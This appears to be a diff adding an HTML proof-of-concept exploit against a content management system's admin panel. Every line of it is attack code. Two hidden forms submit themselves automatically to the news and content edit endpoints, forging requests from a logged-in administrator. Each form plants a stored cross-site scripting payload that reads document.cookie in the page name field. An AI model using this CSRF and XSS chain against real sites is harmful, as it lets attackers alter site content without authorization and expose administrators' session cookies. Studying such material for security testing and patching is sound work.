@@ -1,0 +1,39 @@
+&lt;form action=&quot;http://host/admin/news/edit/PAGEID/do/&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;referer&quot; value=&quot;hello&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;domain&quot; value=&quot;host&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;news&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;alt-name&quot; value=&quot;altname&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;active&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;active&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;type-id&quot; value=&quot;23&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;save-mode&quot; value=&quot;Save&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;template-id&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;is-visible&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;is-default&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;perms_read[2373]&quot; value=&quot;1&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://[host]/admin/content/edit/PAGEID/do/&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;referer&quot; value=&quot;google&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;domain&quot; value=&quot;[host]&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;price3&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;alt-name&quot; value=&quot;price&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;active&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;active&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;type-id&quot; value=&quot;10&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;save-mode&quot; value=&quot;Save&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;template-id&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;is-visible&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;is-visible&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;is-default&quot; value=&quot;0&quot;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
